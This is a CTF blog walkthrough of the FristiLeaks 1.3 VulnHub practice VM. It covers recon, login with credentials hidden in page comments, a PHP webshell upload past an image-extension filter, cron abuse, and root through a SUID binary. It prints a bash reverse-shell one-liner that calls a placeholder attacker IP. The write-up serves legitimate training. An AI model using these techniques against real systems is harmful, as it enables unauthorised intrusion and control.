Title: Frisitleaks 1.3
Date: 2018-12-01
Modified: 2018-12-01
Category: ctf
Tags: ctf, vulnhub
Slug: fristileaks
Authors: Riley
Summary: Guide to the Fristileaks 1.3 VulnHub box.

## Description

A small VM made for a Dutch informal hacker meetup called Fristileaks.
Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..

## Setup

The virtual machine requires DHCP, and you have to manually set the machine's MAC address to **08:00:27:A5:A6:76**.
My setup runs on an isolated network `10.100.100.0/24`, and the attacking box is at `10.100.100.99/24`.
You can find the box [here][0] to follow along or do yourself.


# Reconnaissance

First we should verify that the box is online. After, we can determine what services are running on the target.

#### Netdiscover
![netdiscover](/images/ctf/fristileaks/netdiscover.png "Netdiscover")

#### Nmap
```text
# Nmap 7.70 scan initiated  as: nmap -sC -sV -oA nmap/fristileaks 10.100.100.133
Nmap scan report for 10.100.100.133
Host is up (0.00032s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
```

From this, we can determine that the target is running an Apache webserver on port 80.
Further scans did not reveal any other external services.

Using a browser to navigate to the site reveals a colourful webpage, but nowhere obvious to go:

![Fristileaks homepage](/images/ctf/fristileaks/homepage.png "Fristileaks homepage")

There is very little content on this page, however nmap found a `http-robots.txt` file that had some directories listed.
Viewing any of them reveals a sneaky trick, and another dead end.

![Not the URL we are looking for](/images/ctf/fristileaks/droid.png "Not the URL we are looking for")

Navigating to `/admin` only leads to a 404 Not Found message, so we will have to input other possible directory or URI names.
Fortunately, we don't have to brute force this puzzle.
By simply going to `/fristi`, one will be rewarded with a hidden admin portal asking for credentials.

![Fristileaks hidden admin page](/images/ctf/fristileaks/adminpage.png "Fristileaks hidden admin page")


# Exploitatin && Gaining Access

Attempting to bypass the authentication using typical methods (such as SQLi or default creds) doesn't seem to work.
While taking a look at the page source, we find a few interesting comments.

One a TODO list by **eezeepz**,

![Comment from eezeepz](/images/ctf/fristileaks/admin-comment.png "Comment from eezeepz")

and the other is Base64 encoded.

![Base64 encoded something](/images/ctf/fristileaks/admin-base64.png "Base64 encoded something")

Decoding the B64 text reveals a PNG image with the text `keKkeKKeKKeKkEkkEk`.
Using `eezeepz:keKkeKKeKKeKkEkkEk` for credentials does work, and redirects us to `/fristi/login_success.php`, with a link to `/fristi/upload.php`.
Progress!

There are some minor restrictions.
The file uploaded must be a PNG, JPG, or GIF image.
Fortunately this is a very simple filter, and easily bypassed.

Simply: locate your PHP webshell of choice (such as `php-reverse-shell.php`, located in `/usr/share/webshells/php` in Kali); copy it to your working directory and modify as needed; rename the file with .png appended (`php-reverse-shell.php.png`); upload the shell, and navigate to `/fristi/uploads/<your-file-name-here>.php.png`.

![Uploading webshell](/images/ctf/fristileaks/upload.png "Uploading webshell")

And just like magic, we now have a shell as the **apache** user account!

![Webshell!](/images/ctf/fristileaks/webshell.png "Webshell!")


# Post-Exploitation

The apache user has very limited privileges, so we should make it our goal to quickly gain access to another user account.

There are three user accounts we could compromise:

![User accounts](/images/ctf/fristileaks/home.png "/home")

Since we don't have access to any directory but `/home/eezeepz`, we will have to start there.

Navigating to **eezeepz**'s home directory, there is a slough of system binaries and a `notes.txt` file:

![Content of notes.txt](/images/ctf/fristileaks/notes.png "Content of notes.txt")

The instructions are pretty straightforward.
By listing binaries using full paths in `/usr/bin`, `/home/admin`, and presumably `/home/eezeepz` in a file called `/tmp/runthis`, a cronjob will execute the binaries every minute as **admin**.

My solution to this was to execute `echo "/home/admin/chmod 707 /home/admin" >> /tmp/runthis`, which will give us read, write, and execute privileges in `/home/admin` as any user.

![Modifying /home/admin privileges](/images/ctf/fristileaks/chmod.png "Modifying /home/admin privileges")


# Privilege Escalation

Taking a look into the newly accessible directory reveals the previously noted system binaries, some python scripts, and two text files `cryptedpass.txt` (owned by admin) and `whoisyourgodnow.txt` (owned by fristigod).

The contents of the text files appear to be the output of the `cryptpass.py` script.

![cryptedpass.txt/cryptpass.py](/images/ctf/fristileaks/cryptpass.png "The contents of cryptedpass.txt and cryptpass.py")

The python script takes a string argument, encodes it in Base64, and then reverses the string and modifies it with ROT13.
This isn't encryption; it's encoding, and passwords should never be encrypted or encoded.

The process is easy to reverse,  especially using [CyberChef][1].

![Reversing cryptedpass.txt](/images/ctf/fristileaks/rev-cryptedpass.png "Reversing cryptedpass.txt")
![Reversing whoisyourgodnow.txt](/images/ctf/fristileaks/rev-whoisyourgodnow.png "Reversing whoisyourgodnow.txt")

At this point I uploaded a PHP reverse shell and caught it with Ncat, as the webshell I used isn't a terminal and thus cannot use `su` or `sudo`.

![su admin](/images/ctf/fristileaks/su-admin.png "su admin")
![su fristigod](/images/ctf/fristileaks/su-fristigod.png "su fristigod")


# Getting Root

Despite being called **admin**, I determined that the account did not have sufficient rights to use sudo.
**Fristigod**, on the other hand, has access to a single binary.

![One true binary](/images/ctf/fristileaks/fristigod-sudo-l.png "One true binary")

Fristigod may run sudo as user **fristi** to execute `/var/fristigod/.secret_admin_stuff/doCom`.
So what is `doCom`?
In our case, it's a SUID binary owned by root that executes shell commands that are fed to it.

![doCom](/images/ctf/fristileaks/doCom.png "doCom")

Let's verify that it runs as root.

![Testing execution](/images/ctf/fristileaks/exec-test.png "Testing execution")

Excellent!

This means that we can execute a simple reverse shell as root. I like using `bash -i >& /dev/tcp/<ATTAKCER-IP>/<PORT> 0>&1` from [pentestmonkey][2].

![Getting root](/images/ctf/fristileaks/get-root.png "Getting root")

![Got root](/images/ctf/fristileaks/got-root.png "Got root")
 


[0]: https://www.vulnhub.com/entry/fristileaks-13,133/
[1]: https://github.com/gchq/CyberChef
[2]: http://pentestmonkey.net/